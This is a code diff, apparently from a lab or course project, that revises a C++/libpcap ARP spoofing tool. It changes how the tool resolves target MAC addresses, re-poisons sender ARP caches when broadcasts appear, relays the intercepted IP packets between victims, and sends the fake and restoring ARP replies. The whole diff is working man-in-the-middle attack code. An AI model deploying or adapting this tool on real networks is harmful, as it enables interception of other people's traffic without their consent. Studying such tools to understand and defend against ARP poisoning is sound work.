@@ -98,32 +98,30 @@ Mac getMacFromIP(pcap_t* handle, const addressInfo &myAddressInfo, const char* i
     arpPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
     arpPacket.arp_.tip_ = htonl(targetIp);
     
-    for (int i=0;i<5;i++)
+    for (int i=0;i<3;i++) {  //send&next
         res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpPacket), sizeof(EthArpPacket));
-    if (res != 0) {
-       	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-    }
-
-    while (true) {
+        if (res != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        }
+        while (true) {
         res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0){      //timeout
-            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpPacket), sizeof(EthArpPacket));
-            if (res != 0) {
-       	        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+            if (res == 0){      //timeout
+                break;
             }
-            continue;
-        }
-        if (res == -1 || res == -2) {
-            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-            exit(0);
-        }
+            if (res == -1 || res == -2) {
+                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+                exit(0);
+            }
 
-        arpReply = (EthArpPacket*)packet;
-        if((arpReply->eth_.type_ == htons(EthHdr::Arp)) && (arpReply->arp_.op_ == htons(ArpHdr::Reply)) 
-                && (arpReply->arp_.sip_.operator==(htonl(targetIp)))){
-            return arpReply->arp_.smac_;
+            arpReply = (EthArpPacket*)packet;
+            if((arpReply->eth_.type_ == htons(EthHdr::Arp)) && (arpReply->arp_.op_ == htons(ArpHdr::Reply)) 
+                    && (arpReply->arp_.sip_.operator==(htonl(targetIp)))){
+                return arpReply->arp_.smac_;
+            }
         }
     }
+    printf("Invalid IP Address\n");
+    exit(0);
 }
 
 void spoofARP(pcap_t* handle, const addressInfo &myAddressInfo){
@@ -162,8 +160,7 @@ void spoofARP(pcap_t* handle, const addressInfo &myAddressInfo){
                     const Ip &s_Ip = myAddressInfo.targetPairs_IP_object[i].first;
                     const Ip &t_Ip = myAddressInfo.targetPairs_IP_object[i].second;
 
-                    if((ethPacket->arp_.sip_.operator==(s_Ip) && ethPacket->arp_.tip_.operator==(t_Ip))        //sender -> target REQ 
-                        || (ethPacket->arp_.sip_.operator==(t_Ip) && ethPacket->arp_.tip_.operator==(s_Ip))){  //target -> sender REQ
+                    if((ethPacket->arp_.tip_==t_Ip) || (ethPacket->arp_.sip_==t_Ip)){                           //target broadcast REQ/REP
                             printf("Re-infecting sender%d: %s\n",i,myAddressInfo.targetPairs[i].first);        //re-infect sender
                             sendFakeARP(handle, myAddressInfo, myAddressInfo.targetPairs[i].first, myAddressInfo.targetPairs[i].second);
                     }
@@ -180,8 +177,8 @@ void spoofARP(pcap_t* handle, const addressInfo &myAddressInfo){
             for (int i = 0; i<myAddressInfo.targetPairs.size(); i++){
                 const Mac &senderMac = myAddressInfo.arpCache.find(myAddressInfo.targetPairs[i].first)->second;
 
-                if((dmac.operator==(myAddressInfo.myMac)) && (smac.operator==(senderMac))   //sender => target Ip packet
-                    && (destIp.operator==(myAddressInfo.targetPairs_IP_object[i].second))){       
+                if((dmac==myAddressInfo.myMac) && (smac==senderMac)   //sender => target Ip packet
+                    && (destIp==myAddressInfo.targetPairs_IP_object[i].second)){       
                     printf("Relaying %d bytes packet: sender%d - %s => target%d - %s\n",
                         header->caplen, i, myAddressInfo.targetPairs[i].first, i, myAddressInfo.targetPairs[i].second);
 
@@ -205,14 +202,16 @@ void spoofARP(pcap_t* handle, const addressInfo &myAddressInfo){
 }
 
 void infectArp(pcap_t* handle, const addressInfo &myAddressInfo){
-    for (const auto& it : myAddressInfo.targetPairs){
+    for (const auto& it : myAddressInfo.targetPairs){   
         sendFakeARP(handle, myAddressInfo, it.first, it.second);     //sendFakeARP(..., senderIp, targetIp)
+        usleep(10000);
     }
 }
 
 void recoverArp(pcap_t* handle, const addressInfo &myAddressInfo){
-    for (const auto& it : myAddressInfo.targetPairs){
+    for (const auto& it : myAddressInfo.targetPairs){     
         sendNormalARP(handle, myAddressInfo, it.first, it.second);   //sendNormalARP(..., senderIp, targetIp)
+        usleep(10000);
     }
 }
 
